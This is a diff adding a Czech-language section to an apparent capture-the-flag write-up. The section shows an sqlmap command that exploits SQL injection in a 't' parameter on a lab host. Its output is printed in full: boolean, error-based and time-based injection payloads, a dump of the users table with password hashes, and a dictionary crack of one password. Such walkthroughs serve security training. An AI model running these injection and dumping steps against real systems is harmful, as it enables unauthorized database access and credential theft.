@@ -160,6 +160,88 @@ Na stránce https://crackstation.net získáme některá hesla:
 Na úvodní stránce se přihlásíme jako uživatel `captain` s heslem `$captainamerica$`
 Vlajka je skryta v `Details` u `Target 4`.
 
+### Poznámka k sqlmap
+
+Výpis lze úspěšně provést i pomocí sqlmap - do parametru `type` dáme nějaký base64 string a sql injection provedeme přes parametr `t`:
+
+```bash
+sqlmap --random-agent -u "http://navigation-plan.cns-jv.tcc/image.png?type=%22MTI0%22&t=targets&id=1" --level 5 --risk 3 -D navigation -T users --dump --threads 3 -p "t"
+GET parameter 't' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 108 HTTP(s) requests:
+---
+Parameter: t (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: type="MTI0"&t=targets WHERE 4161=4161 AND 6142=6142-- MyCw&id=1
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: type="MTI0"&t=targets WHERE 1037=1037 AND (SELECT 9082 FROM(SELECT COUNT(*),CONCAT(0x7171767a71,(SELECT (ELT(9082=9082,1))),0x716b6b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- vXSQ&id=1
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: type="MTI0"&t=targets WHERE 2303=2303 AND (SELECT 5806 FROM (SELECT(SLEEP(5)))PWJU)-- VBog&id=1
+---
+[23:30:49] [INFO] the back-end DBMS is MySQL
+[23:30:49] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
+[23:30:49] [WARNING] if the problem persists please try to lower the number of used threads (option '--threads')
+web application technology: PHP, Apache, PHP 8.2.10
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[23:30:49] [INFO] fetching columns for table 'users' in database 'navigation'
+[23:30:49] [INFO] starting 3 threads
+[23:30:49] [INFO] retrieved: 'username'
+[23:30:49] [INFO] retrieved: 'id'
+[23:30:49] [INFO] retrieved: 'password'
+[23:30:49] [INFO] retrieved: 'varchar(64)'
+[23:30:49] [INFO] retrieved: 'smallint(5) unsigned'
+[23:30:49] [INFO] retrieved: 'varchar(256)'
+[23:30:49] [INFO] retrieved: 'rank'
+[23:30:49] [INFO] retrieved: 'active'
+[23:30:49] [INFO] retrieved: 'tinyint(1)'
+[23:30:49] [INFO] retrieved: 'tinyint(1)'
+[23:30:49] [INFO] fetching entries for table 'users' in database 'navigation'
+[23:30:49] [INFO] starting 3 threads
+[23:30:49] [INFO] retrieved: '0'
+[23:30:49] [INFO] retrieved: '1'
+[23:30:49] [INFO] retrieved: '1'
+[23:30:49] [INFO] retrieved: '1'
+[23:30:49] [INFO] retrieved: '0'
+[23:30:49] [INFO] retrieved: '1'
+[23:30:49] [INFO] retrieved: '1'
+[23:30:49] [INFO] retrieved: '2'
+[23:30:49] [INFO] retrieved: '3'
+[23:30:49] [INFO] retrieved: '15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225'
+[23:30:49] [INFO] retrieved: '6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb'
+[23:30:49] [INFO] retrieved: '7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537'
+[23:30:49] [INFO] retrieved: 'engeneer'
+[23:30:49] [INFO] retrieved: 'officer'
+[23:30:49] [INFO] retrieved: 'captain'
+[23:30:50] [INFO] recognized possible password hashes in column 'password'
+do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] 
+do you want to crack them via a dictionary-based attack? [Y/n/q] 
+[23:30:56] [INFO] using hash method 'sha256_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/usr/share/sqlmap/data/txt/wordlist.tx_' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 
+[23:30:59] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] 
+[23:31:03] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
+[23:31:03] [INFO] starting 8 processes 
+[23:31:03] [INFO] cracked password '123456789' for user 'engeneer'                                                                                                                                                                    
+Database: navigation                                                                                                                                                                                                                  
+Table: users
+[3 entries]
++----+--------+----------+------------------------------------------------------------------------------+----------+
+| id | rank   | active   | password                                                                     | username |
++----+--------+----------+------------------------------------------------------------------------------+----------+
+| 1  | 1      | 0        | 15e2b0d3c33891ebb0f1ef609ec419420c20e320ce94c65fbc8c3312448eb225 (123456789) | engeneer |
+| 2  | 0      | 1        | 7de22a47a2123a21ef0e6db685da3f3b471f01a0b719ef5774d22fed684b2537             | captain  |
+| 3  | 1      | 1        | 6a4aed6869c8216e463054dcf7e320530b5dc5e05feae6d6d22a4311e3b22ceb             | officer  |
++----+--------+----------+------------------------------------------------------------------------------+----------+
+```
+
 ## Vlajka
 
 ```
